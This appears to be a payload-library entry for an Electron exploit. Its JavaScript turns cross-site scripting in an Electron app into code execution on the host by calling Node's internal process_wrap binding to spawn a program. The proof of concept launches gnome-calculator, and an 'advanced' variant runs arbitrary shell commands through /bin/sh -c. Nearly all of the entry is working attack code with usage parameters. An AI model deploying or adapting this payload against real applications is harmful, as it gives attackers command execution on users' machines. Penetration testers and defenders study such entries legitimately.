---
id: cmd-spawn-process-001
data: >-
  var Process = process.binding('process_wrap').Process; var proc = new
  Process(); proc.onexit = function(a,b) {}; var env = process.env; var env_ =
  []; for (var key in env) env_.push(key+'='+env[key]);
  proc.spawn({file:'/usr/bin/gnome-calculator',cwd:null,windowsVerbatimArguments:false,detached:false,envPairs:env_,stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]});
tags:
  - rce
  - nodejs
  - process
type: command
output: Gnome calculator application launches
executor: javascript
platforms:
  - Desktop
  - Electron
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:28.395Z'
verified: false
validated: true
submitted: true
---
# spawn-process-rce

## Command

```javascript
var Process = process.binding('process_wrap').Process;
var proc = new Process();
proc.onexit = function(a,b) {};
var env = process.env;
var env_ = [];
for (var key in env) env_.push(key+'='+env[key]);
proc.spawn({
  file:'/usr/bin/gnome-calculator',
  cwd:null,
  windowsVerbatimArguments:false,
  detached:false,
  envPairs:env_,
  stdio:[{type:'ignore'},{type:'ignore'},{type:'ignore'}]
});
```

## Description

Creates a new Node.js Process object using Electron's bindings and spawns an external application like gnome-calculator, achieving RCE from XSS context.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| file | Path to executable (e.g., '/usr/bin/gnome-calculator') | Yes |
| cwd | Working directory | No |
| stdio | I/O configuration array | No |
| envPairs | Environment variables | No |

## Examples

### Basic Usage

```javascript
// As above, spawns calculator
```

### Advanced Usage

```javascript
// Modify file for other commands
proc.spawn({file:'/bin/sh', args:['-c', 'command']});
```

## Expected Output

The specified application (gnome-calculator) launches on the desktop.

## Related

- [[Related Procedure: Escalate-XSS-to-RCE-with-Encoded-Payload]]
